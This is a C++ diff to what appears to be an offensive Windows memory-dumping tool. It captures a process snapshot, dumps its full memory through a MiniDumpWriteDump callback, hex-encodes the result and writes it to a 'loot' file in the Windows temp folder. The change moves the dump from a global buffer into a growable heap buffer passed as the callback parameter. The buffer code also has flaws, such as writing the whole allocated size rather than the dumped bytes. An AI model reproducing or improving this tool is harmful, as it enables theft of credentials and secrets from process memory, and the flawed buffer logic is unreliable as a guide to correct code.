@@ -15,10 +15,10 @@ typedef DWORD(__cdecl *PPssFreeSnapshot)(HANDLE, HPSS);
 // dump write path
 const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot";
 
-// global callback buffer on heap for minidump
-// could also use CallbackParam in in callback routine
-LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75*2);
-DWORD bufferSize = 0;
+typedef struct SmartArray {
+	LPVOID buffer;
+	int size;
+}SmartArray;
 
 // Windows version table https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw#remarks
 // true if versions satisfy minimum Major/Minor version for Server/DomainController or Workstation
@@ -93,6 +93,7 @@ BOOL CALLBACK MyMiniDumpWriteDumpCallback(
 {
 	LPVOID destination = 0, source = 0;
 	DWORD bytesRead = 0;
+	SmartArray* buff;
     switch (CallbackInput->CallbackType)
     {
 		case IoStartCallback:
@@ -100,23 +101,44 @@ BOOL CALLBACK MyMiniDumpWriteDumpCallback(
 			break;
 		case IoWriteAllCallback:
 			CallbackOutput->Status = S_OK;
-
-			// get source buffer of minidump data to be written to global dumpBuffer
+			// get source buffer of minidump data to be written to buffer
 			source = CallbackInput->Io.Buffer;
 			// get size of bytes read
 			bytesRead = CallbackInput->Io.BufferBytes;
 
+			// get buffer from callback parameter
+			buff = (SmartArray*)CallbackParam;
+
+			// check if allocation is bigger then array and resize
+			if (CallbackInput->Io.Offset * 2 + CallbackInput->Io.BufferBytes >= buff->size) {
+				// CallbackInput->Io.Offset * 2 + CallbackInput->Io.BufferBytes will never be smaller then buff
+				int oldSize = buff->size;
+				int newSize = (CallbackInput->Io.Offset * 4) + CallbackInput->Io.BufferBytes; // double size of offset + buffer
+
+				// create new buffer
+				PVOID tempBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newSize);
+				// copy old buffer to new buffer
+				memcpy(tempBuff, buff->buffer, oldSize);
+				// free old buffer
+				HeapFree(GetProcessHeap(),0,buff->buffer);
+				// switch old with new buffer in callback parameter
+				buff->buffer = tempBuff;
+				buff->size = newSize;
+
+				// initalize new mem to '0'
+				for (int i = oldSize; i < newSize; i++) {
+					((char*) buff->buffer)[i] = '0';
+				}
+			}
+
 			// get offset for write
 			// **does not write sequencially**
 			// **only readable bytes are provided, i.e: unused bytes in memory are not written**
-			destination = (LPVOID)((DWORD_PTR)dumpBuffer + ((DWORD_PTR)CallbackInput->Io.Offset*2));
+			destination = (LPVOID)((DWORD_PTR)buff->buffer + ((DWORD_PTR)CallbackInput->Io.Offset*2));
 
-			// TODO: use callback param instead of global buffer
-			// copy from minidump buffer to global dumpBuffer
+			// copy from minidump buffer to buffer
 			binToHex((char*)destination, (char*)source, bytesRead);
 
-			// add to total size of dumpBuffer
-			bufferSize += bytesRead*2;
 			break;
 		case IoFinishCallback:
 			CallbackOutput->Status = S_OK;
@@ -166,16 +188,22 @@ BOOL pssMiniDumpLoot() {
 	//DWORD dwResultCode = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
 	if (dwResultCode != ERROR_SUCCESS) return FALSE;
 
+	// initialize callback parameter
+	SmartArray* buff = new SmartArray{
+		HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75),
+		1024 * 1024 * 75
+	};
+
 	// initialize buffer with '0' chars, since minidump doesn't write unreadable process memory
-	for (int i = 0; i < 1024 * 1024 * 75 * 2; i++) {
-		((char*)dumpBuffer)[i] = '0';
+	for (int i = 0; i < 1024 * 1024 * 75; i++) {
+		((char*) buff->buffer)[i] = '0';
 	}
 
 	// callback info
 	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
 	ZeroMemory(&CallbackInfo, sizeof (MINIDUMP_CALLBACK_INFORMATION));
 	CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
-	CallbackInfo.CallbackParam = NULL;
+	CallbackInfo.CallbackParam = (PVOID)buff;
 	// use callback routine to tell MiniDumpWriteDump to capture from snapshot
 	BOOL cDump = MiniDumpWriteDump(SnapshotHandle,processId, NULL,MiniDumpWithFullMemory,NULL,NULL,&CallbackInfo);
 
@@ -184,7 +212,7 @@ BOOL pssMiniDumpLoot() {
 
 	// write encoded minidump to file
 	DWORD bytesWritten = 0;
-	WriteFile(hFile, dumpBuffer, bufferSize, &bytesWritten, NULL);
+	WriteFile(hFile, buff->buffer, buff->size, &bytesWritten, NULL);
 
 	CloseHandle(hFile);
 	CloseHandle(hProcess);
